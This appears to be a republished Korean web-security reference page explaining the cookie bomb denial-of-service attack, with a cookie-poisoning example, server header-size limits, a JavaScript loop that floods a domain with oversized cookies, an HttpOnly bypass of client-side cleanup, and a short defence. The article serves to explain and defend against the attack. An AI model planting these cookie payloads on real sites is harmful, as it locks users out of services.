@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cookie Bomb Attack — PIXN</title>
+  <meta name="description" content="Cookie Bomb Attack — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="Cookie Bomb Attack — PIXN"><meta property="og:description" content="Cookie Bomb Attack — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>Cookie Bomb Attack</h1>
+      <time datetime="2021-10-16">OCTOBER 16, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>Cookie bomb은 비정상적으로 큰 쿠키 값을 이용해서 DOS를 유도하는 공격 방법입니다. 기본적으로 가용성을 침해하는 DOS 공격이 주를 이루며, 이외에도 다른 취약점과 Chain attack 형태로 사용될 가능성이 존재합니다.</p>
+<p>일반적으로 HTTP Request의 헤더값이 큰 경우 서비스에서 413 Request Entity Too Large 또는 400 Bad Request 등의 에러를 반환하게 됩니다. 이러한 에러를 유도할 수 있는 헤더에는 대표적으로 Cookie 헤더가 있으며, File cookie에 대량의 데이터가 삽입된 경우 해당 쿠키를 초기화 하지 않는 이상 모든 요청에서 413, 400 에러등이 발생할 수 있습니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>서비스에서 쿠키를 설정할 수 있는 포인트 필요합니다. 가장 간단하게는 XSS 그리고 Cookie poisoning이 있습니다. 이렇게 임의 쿠키를 사용자에게 세팅할 수 있는 부분이 있다면 Cookie bomb attack을 성공할 가능성이 존재하게 됩니다.</p>
+<p><strong>e.g (cookie poisoning)</strong></p>
+<pre><code>GET /info?locale=KR999 HTTP/1.1
+</code></pre>
+<pre><code>HTTP/1.1 200 OK
+Set-Cookie: localeCookie=KR999;
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>웹 서버들은 아래와 같은 사이즈의 헤더 요청이 있는 경우 에러를 생성합니다.</p>
+<table>
+<thead>
+<tr>
+<th>Server</th>
+<th>Size</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nginx</td>
+<td>4KB - 8KB</td>
+</tr>
+<tr>
+<td>Apache</td>
+<td>8KB</td>
+</tr>
+<tr>
+<td>Tomcat</td>
+<td>8KB - 48KB</td>
+</tr>
+<tr>
+<td>IIS</td>
+<td>8KB - 16KB</td>
+</tr>
+</tbody>
+</table>
+<p>해당 데이터 보다 큰 쿠키값을 세팅하면 해당 파일 쿠키를 삭제하지 않는 이상 매번 접근 시 에러 메시지가 발생하여 정상적으로 서비스를 이용할 수 없게 됩니다.</p>
+<p><strong>Set-Cookie</strong></p>
+<pre><code>HTTP/1.1 200 OK
+Set-Cookie: localeCookie=aaaaaaaaa------big-size---------bbvbbbb;
+</code></pre>
+<p><strong>With Javascript</strong></p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">var</span> base_domain <span class="hljs-operator">=</span> <span class="hljs-string">&quot;example.com&quot;</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">var</span> pollution <span class="hljs-operator">=</span> <span class="hljs-built_in">Array</span><span class="hljs-punctuation">(</span><span class="hljs-number">4000</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>join<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;a&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">for</span><span class="hljs-punctuation">(</span><span class="hljs-keyword">var</span> i<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-punctuation">;</span>i<span class="hljs-operator">&lt;</span><span class="hljs-number">100</span><span class="hljs-punctuation">;</span>i<span class="hljs-operator">++</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span>
+  <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>cookie<span class="hljs-operator">=</span><span class="hljs-string">&#39;bomb&#39;</span><span class="hljs-operator">+</span>i<span class="hljs-operator">+</span><span class="hljs-string">&#39;=&#39;</span><span class="hljs-operator">+</span>pollution<span class="hljs-operator">+</span><span class="hljs-string">&#39;;domain=&#39;</span><span class="hljs-operator">+</span>base_domain<span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+<h3 id="bypass-protection">Bypass protection</h3>
+<p>해당 공격의 대응방안인 쿠키정보 초기화를 Javascript 단에서 처리하는 경우 아래와 같이 JS에서 컨트롤 할 수 없도록 HttpOnly 속성을 주어 보호 로직을 우회할 수 있습니다.</p>
+<pre><code>HTTP/1.1 200 OK
+Set-Cookie: localeCookie=aaaaaaaaa------big-size---------bbvbbbb; HttpOnly;
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>비 정상적인 쿠키 요청이 있는 경우 무조건 에러로 처리하는 것이 아닌 커스텀 에러 페이지에서 Set-Cookie로 해당 쿠키의 expire 등을 조정하여 쿠키를 초기화하는 것이 가장 좋습니다.</p>
+<h2 id="references">References</h2>
+<ul>
+<li>https://blog.rubiya.kr/index.php/2020/10/02/cookie-bomb/</li>
+<li>https://hitcon.org/2019/CMT/slide-files/d1_s3_r0.pdf</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/cookie-bomb-attack/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
